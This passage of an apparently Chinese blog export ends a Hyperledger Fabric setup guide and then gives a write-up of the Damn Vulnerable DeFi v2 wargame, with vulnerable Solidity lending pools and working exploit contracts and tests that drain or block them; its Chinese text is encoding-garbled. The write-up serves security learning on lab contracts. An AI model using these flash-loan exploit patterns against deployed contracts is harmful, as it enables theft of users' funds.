lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br><br></code></pre></td></tr></table></figure><h3 id="æäº¤chaincode"><a href="#æäº¤chaincode" class="headerlink" title="æäº¤chaincode"></a>æäº¤chaincode</h3><p>ä½¿ç”¨<code>checkcommitreadiness</code>æŸ¥çœ‹chaincodeæ˜¯å¦å·²ç»è¢«approve</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">âœ  test-network git:(ad8fc2f) âœ— peer lifecycle chaincode checkcommitreadiness --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --output json <br><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>commit</code>æ“ä½œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt <br></code></pre></td></tr></table></figure><p>æµ‹è¯•chaincodeæ˜¯å¦å·²ç»æˆåŠŸæäº¤åˆ°channel</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">âœ  test-network git:(ad8fc2f) âœ— peer lifecycle chaincode querycommitted --channelID channel1 --name basic --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br><br></code></pre></td></tr></table></figure><h3 id="invoke-chaincode"><a href="#invoke-chaincode" class="headerlink" title="invoke chaincode"></a>invoke chaincode</h3><p>invoke</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer chaincode invoke -o localhost<span class="hljs-function">:7050</span> <span class="hljs-params">--ordererTLSHostnameOverride</span> orderer.example.com <span class="hljs-params">--tls</span> <span class="hljs-params">--cafile</span> <span class="hljs-string">&quot;$&#123;PWD&#125;/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem&quot;</span> -C channel1 -n basic <span class="hljs-params">--peerAddresses</span> localhost<span class="hljs-function">:7051</span> <span class="hljs-params">--tlsRootCertFiles</span> <span class="hljs-string">&quot;$&#123;PWD&#125;/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt&quot;</span> <span class="hljs-params">--peerAddresses</span> localhost<span class="hljs-function">:9051</span> <span class="hljs-params">--tlsRootCertFiles</span> <span class="hljs-string">&quot;$&#123;PWD&#125;/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt&quot;</span> -c &#x27;&#123;<span class="hljs-string">&quot;function&quot;</span>:<span class="hljs-string">&quot;InitLedger&quot;</span>,<span class="hljs-string">&quot;Args&quot;</span>:[]&#125;&#x27;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å¯ä»¥ä» CLI æŸ¥è¯¢åˆ†ç±»å¸ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥è·å–å·²æ·»åŠ åˆ°æ‚¨çš„é¢‘é“åˆ†ç±»å¸çš„èµ„äº§åˆ—è¡¨ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">peer</span> chaincode query -C channel<span class="hljs-number">1</span> -n basic -c &#x27;&#123;<span class="hljs-string">&quot;Args&quot;</span>:[<span class="hljs-string">&quot;GetAllAssets&quot;</span>]&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><p><a href="https://github1s.com/hyperledger/fabric-samples">hyperledger/fabric-samplesåˆçº¦ä»£ç </a></p><p>ä»¥ä¸Šæ˜¯è‡ªåŠ¨åŒ–å®ç°ç¯å¢ƒæ­å»ºï¼Œå…¶ä¸­è¯¦ç»†åŸç†å¯ä»¥é€šè¿‡æ‰‹åŠ¨æ­å»ºç¯å¢ƒæ¥ç†è§£ï¼Œå‚è€ƒä»¥ä¸‹æ–‡ç« ï¼š</p><p><a href="https://ifantasy.net/2022/03/29/hyperledger_fabric_0_test_network_explain/">Hyperledger Fabricçš„test-networkå¯åŠ¨è¿‡ç¨‹Bashæºç è¯¦è§£</a></p><p><a href="https://juejin.cn/post/7035894330631913509">ä¸€ç¯‡æ–‡ç« ä¸Šæ‰‹Fabric CAçš„ä½¿ç”¨</a></p><p><a href="https://juejin.cn/post/7035956873224257566">Fabric CA æ“ä½œæŒ‡å—</a></p><p>å®šåˆ¶è”ç›Ÿé“¾ç½‘ç»œ</p><p><a href="https://ifantasy.net/2022/04/01/hyperledger_fabric_1_custom_our_network/">Hyperledger Fabricå®šåˆ¶è”ç›Ÿé“¾ç½‘ç»œå·¥ç¨‹å®è·µ</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>fabric</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Damn vulnerable defi v2</title>
    <link href="/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/"/>
    <url>/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.damnvulnerabledefi.xyz/">é¶åœºé“¾æ¥</a></p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li><code>git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git</code><br>ï¼ˆå…‹éš†å­˜å‚¨åº“ï¼‰</li><li><code>cd damn-vulnerable-defi/</code><br>ï¼ˆè¿›å…¥å­˜å‚¨åº“ï¼‰</li><li><code>npm install -g yarn</code><br>ï¼ˆå½“å‰èŠ‚ç‚¹ç‰ˆæœ¬å…¨å±€å®‰è£…yarnï¼‰</li><li><code>yarn</code><br>ï¼ˆç¡®ä¿åœ¨å­˜å‚¨åº“ä¸­è¿è¡Œå®ƒä»¥å®‰è£…ä¾èµ–é¡¹ï¼‰</li></ul><p>ä½¿ç”¨<code>yarn run challenge-name</code>. å¦‚æœæŒ‘æˆ˜æˆåŠŸæ‰§è¡Œï¼Œæ‚¨å°±é€šè¿‡äº†ï¼</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(yarn <span class="hljs-builtin-name">run</span> challenge-nameå¤±è´¥å¯ä»¥å°è¯•)<br><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">http_proxy</span>=http://127.0.0.1:7890<br><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">https_proxy</span>=http://127.0.0.1:7890<br></code></pre></td></tr></table></figure><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><blockquote><p>Thereâ€™s a lending pool with a million DVT tokens in balance, offering flash loans for free.</p><p>If only there was a way to attack and stop the pool from offering flash loans â€¦</p><p>You start with 100 DVT tokens in balance.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function flashLoan(uint256 borrowAmount) external nonReentrant &#123;<br>        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);<br><br>        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));<br>        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);<br><br>        // Ensured by the protocol via the `depositTokens` function<br>        assert(poolBalance == balanceBefore);<br>        <br>        damnValuableToken.transfer(msg.sender, borrowAmount);<br>        <br>        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);<br>        <br>        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));<br>        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦åšçš„æ˜¯ä½¿ <code>poolBalance == balanceBefore</code> ä¸æˆç«‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-comment">//await this.token.transfer(this.pool.address, 1, &#123; from: attacker&#125; );</span><br>    <span class="hljs-comment">// Make sure we interact with token contract as &quot;attacker&quot;.</span><br>    <span class="hljs-built_in">this</span>.token.connect(attacker);<br>    <span class="hljs-comment">// Send 1 token to pool.</span><br>    <span class="hljs-built_in">this</span>.token.transfer(<span class="hljs-built_in">this</span>.pool.address, <span class="hljs-number">1</span>);<br><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><blockquote><p>Thereâ€™s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p><p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</p><p>Drain all ETH funds from the userâ€™s contract. Doing it in a single transaction is a big plus ;)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function receiveEther(uint256 fee) public payable &#123;<br>       require(msg.sender == pool, &quot;Sender must be pool&quot;);<br><br>       uint256 amountToBeRepaid = msg.value + fee;<br><br>       require(address(this).balance &gt;= amountToBeRepaid, &quot;Cannot borrow that much&quot;);<br>       <br>       _executeActionDuringFlashLoan();<br>       <br>       // Return funds to pool<br>       pool.sendValue(amountToBeRepaid);<br>   &#125;<br><br>   function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;<br><br>       uint256 balanceBefore = address(this).balance;<br>       require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);<br><br><br>       require(borrower.isContract(), &quot;Borrower must be a deployed contract&quot;);<br>       // Transfer ETH and handle control to receiver<br>       borrower.functionCallWithValue(<br>           abi.encodeWithSignature(<br>               &quot;receiveEther(uint256)&quot;,<br>               FIXED_FEE<br>           ),<br>           borrowAmount<br>       );<br>       <br>       require(<br>           address(this).balance &gt;= balanceBefore + FIXED_FEE,<br>           &quot;Flash loan hasn&#x27;t been paid back&quot;<br>       );<br>   &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨receiveEtherå‡½æ•°ï¼Œæ”¯ä»˜10æ¬¡æ‰‹ç»­è´¹ï¼Œä½†æ˜¯è¦æ»¡è¶³ <code>msg.sender == pool</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-built_in">this</span>.pool.connect(attacker);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">10</span>;i ++)&#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.pool.flashLoan(<span class="hljs-built_in">this</span>.receiver.address,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><blockquote><p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</p><p>Currently the pool has 1 million DVT tokens in balance. And you have nothing.</p><p>But donâ€™t worry, you might be able to take them all from the pool. In a single transaction.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function flashLoan(<br>       uint256 borrowAmount,<br>       address borrower,<br>       address target,<br>       bytes calldata data<br>   )<br>       external<br>       nonReentrant<br>   &#123;<br>       uint256 balanceBefore = damnValuableToken.balanceOf(address(this));<br>       require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);<br>       <br>       damnValuableToken.transfer(borrower, borrowAmount);<br>       target.functionCall(data);<br><br>       uint256 balanceAfter = damnValuableToken.balanceOf(address(this));<br>       require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);<br>   &#125;<br></code></pre></td></tr></table></figure><ol><li>ä½¿ç”¨approveå‡½æ•°æ‰¹å‡†</li><li>è°ƒç”¨flashLoanå¹¶åˆ©ç”¨data</li><li>transferFrom</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE  */</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-built_in">this</span>.token.interface.encodeFunctionData(<span class="hljs-string">&quot;approve&quot;</span>, [attacker.address,TOKENS_IN_POOL.toHexString()],);<br><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.pool.connect(attacker).flashLoan(<span class="hljs-number">0</span>, attacker.address, <span class="hljs-built_in">this</span>.token.address, data);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.token.connect(attacker).transferFrom(<span class="hljs-built_in">this</span>.pool.address, attacker.address, TOKENS_IN_POOL);<br>&#125;);<br></code></pre></td></tr></table></figure><p><a href="https://docs.ethers.io/v5/api/utils/abi/interface/#Interface--encoding">interface.encodeFunctionData</a> çš„ç”¨æ³•</p><p><img src="/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/image-20220409140557860.png" alt="image-20220409140557860"></p><h2 id="Side-entrance"><a href="#Side-entrance" class="headerlink" title="Side entrance"></a>Side entrance</h2><blockquote><p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p><p>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p><p>You must take all ETH from the lending pool.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IFlashLoanEtherReceiver &#123;<br>    function execute() external payable;<br>&#125;<br><br>contract SideEntranceLenderPool &#123;<br>    using Address for address payable;<br><br>    mapping (address =&gt; uint256) private balances;<br><br>    function deposit() external payable &#123;<br>        balances[msg.sender] += msg.value;<br>    &#125;<br><br>    function withdraw() external &#123;<br>        uint256 amountToWithdraw = balances[msg.sender];<br>        balances[msg.sender] = 0;<br>        msg.sender.sendValue(amountToWithdraw);<br>    &#125;<br><br>    function flashLoan(uint256 amount) external &#123;<br>        uint256 balanceBefore = address(this).balance;<br>        require(balanceBefore &gt;= amount, &quot;Not enough ETH in balance&quot;);<br>        <br>        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();<br><br>        require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);        <br>    &#125;<br>&#125;<br> <br></code></pre></td></tr></table></figure><ol><li>è°ƒç”¨flashLoanï¼Œä¸­é€”æŠŠé’±depositå›æ± ä¸­ï¼Œä½¿ <code>address(this).balance &gt;= balanceBefore</code> æˆç«‹</li><li>å–å‡ºå­˜æ¬¾</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../side-entrance/SideEntranceLenderPool.sol&quot;;<br>import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;<br><br>contract SideEntranceAttacker is IFlashLoanEtherReceiver&#123;<br>    using Address for address payable;<br><br>    SideEntranceLenderPool pool;<br><br>    function attack(SideEntranceLenderPool _pool) external &#123;<br>        pool = _pool;<br>        pool.flashLoan(address(pool).balance);<br>        pool.withdraw();<br>        payable(msg.sender).sendValue(address(this).balance);<br>    &#125;<br><br>    function execute() external payable override &#123;<br>        pool.deposit&#123;value:msg.value&#125;();<br>    &#125;<br><br>    receive() external payable&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** YOUR EXPLOIT GOES HERE */</span><br>    <span class="hljs-keyword">const</span> SideEntranceAttacker = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;SideEntranceAttacker&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> Attack = <span class="hljs-keyword">await</span> SideEntranceAttacker.deploy();<br>    <span class="hljs-keyword">await</span> Attack.attack(<span class="hljs-built_in">this</span>.pool.address);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="The-rewarder"><a href="#The-rewarder" class="headerlink" title="The rewarder"></a>The rewarder</h2><blockquote><p>Thereâ€™s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p><p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p><p>You donâ€™t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p><p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isnâ€™t it offering DVT tokens in flash loans?</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function distributeRewards() public returns (uint256) &#123;<br>    uint256 rewards = 0;<br><br>    if(isNewRewardsRound()) &#123;<br>        _recordSnapshot();<br>    &#125;        <br>    <br>    uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);<br>    uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);<br><br>    if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;<br>        rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;<br><br>        if(rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;<br>            rewardToken.mint(msg.sender, rewards);<br>            lastRewardTimestamps[msg.sender] = block.timestamp;<br>        &#125;<br>    &#125;<br><br>    return rewards;     <br>&#125;<br><br><br>    function flashLoan(uint256 amount) external nonReentrant &#123;<br>        uint256 balanceBefore = liquidityToken.balanceOf(address(this));<br>        require(amount &lt;= balanceBefore, &quot;Not enough token balance&quot;);<br><br>        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);<br>        <br>        liquidityToken.transfer(msg.sender, amount);<br><br>        msg.sender.functionCall(<br>            abi.encodeWithSignature(<br>                &quot;receiveFlashLoan(uint256)&quot;,<br>                amount<br>            )<br>        );<br><br>        require(liquidityToken.balanceOf(address(this)) &gt;= balanceBefore, &quot;Flash loan not paid back&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä» <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/the-rewarder/the-rewarder.challenge.js">test setup</a> å¯ä»¥çœ‹åˆ°æ”»å‡»å¼€å§‹æ—¶ï¼Œ4 ä¸ªç”¨æˆ·åœ¨ä¸Šä¸€è½®å·²ç»å­˜å…¥äº† 400 ä¸ªä»£å¸ï¼Œæ¯äººè·å¾—äº† 25 ä¸ªå¥–åŠ±ä»£å¸ã€‚ä¸”æˆ‘ä»¬å¯ä»¥ä»å¦ä¸€ä¸ªæ± ä¸­ä»¥é—ªç”µè´·çš„å½¢å¼å€Ÿæœ€å¤š 1000000 ä¸ªä»£å¸ã€‚</p><p>è€Œå¥–åŠ±çš„è®¡ç®—æ–¹å¼æ˜¯æ•´å‹ï¼Œå¿½ç•¥äº†å°æ•°éƒ¨åˆ†ï¼Œåªè¦æˆ‘ä»¬çš„æŠ•å…¥é‡‘é¢è¶³å¤Ÿå¤§ï¼Œå°±ä¼šå¿½ç•¥æ‰å…¶ä»–å››ä¸ªç”¨æˆ·çš„å¥–åŠ±ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../the-rewarder/FlashLoanerPool.sol&quot;;<br>import &quot;../the-rewarder/TheRewarderPool.sol&quot;;<br>import &quot;../the-rewarder/RewardToken.sol&quot;;<br>import &quot;../the-rewarder/AccountingToken.sol&quot;;<br><br>contract TheRewarderAttacker &#123;<br>    FlashLoanerPool flashLoanerPool;<br>    DamnValuableToken immutable liquidityToken;<br>    TheRewarderPool theRewarderPool;<br>    RewardToken rewardToken;<br><br>    constructor(address liquidityTokenAddress, address rewardTokenAddress, FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool) &#123;<br>        liquidityToken = DamnValuableToken(liquidityTokenAddress);<br>        rewardToken = RewardToken(rewardTokenAddress);<br>        theRewarderPool = _theRewarderPool;<br>        flashLoanerPool = _flashLoanerPool;<br>    &#125;<br><br>    function attack(uint256 amount) external &#123;<br>        flashLoanerPool.flashLoan(amount);<br><br>        rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));<br>    &#125;<br><br>    function receiveFlashLoan(uint256 amount) external &#123;<br>        //å­˜å…¥æ‰€æœ‰é—ªè´·å‡ºçš„token<br>        liquidityToken.approve(address(theRewarderPool),amount);<br>        //rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));<br>        theRewarderPool.deposit(amount);<br>        //åˆ†å‘å¥–åŠ±<br>        //è°ƒç”¨depositå‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨distributeRewardså‡½æ•°<br>        //theRewarderPool.distributeRewards();<br>        //å–å‡ºtoken<br>        theRewarderPool.withdraw(amount);<br>        //å½’è¿˜é—ªè´·<br>        liquidityToken.transfer(address(flashLoanerPool),amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span 